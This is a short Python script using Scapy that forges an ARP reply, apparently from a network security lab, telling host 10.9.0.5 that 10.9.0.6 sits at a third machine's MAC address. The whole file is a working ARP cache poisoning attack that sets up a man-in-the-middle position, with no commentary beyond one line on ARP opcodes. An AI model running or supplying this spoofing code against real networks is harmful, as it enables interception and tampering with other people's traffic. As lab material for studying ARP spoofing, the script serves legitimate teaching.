#!/usr/bin/env python3
from scapy.all import *

IP_A='10.9.0.5'
MAC_A='02:42:0a:09:00:05'
IP_B='10.9.0.6'
MAC_B='02:42:0a:09:00:06'
MAC_M='02:42:0a:09:00:69'

E = Ether(dst='ff:ff:ff:ff:ff:ff', src=MAC_M)
A = ARP(hwsrc=MAC_M, psrc=IP_B, hwdst=MAC_A, pdst=IP_A)
A.op = 2 # 1 for ARP request; 2 for ARP reply
pkt = E/A
pkt.show()
sendp(pkt)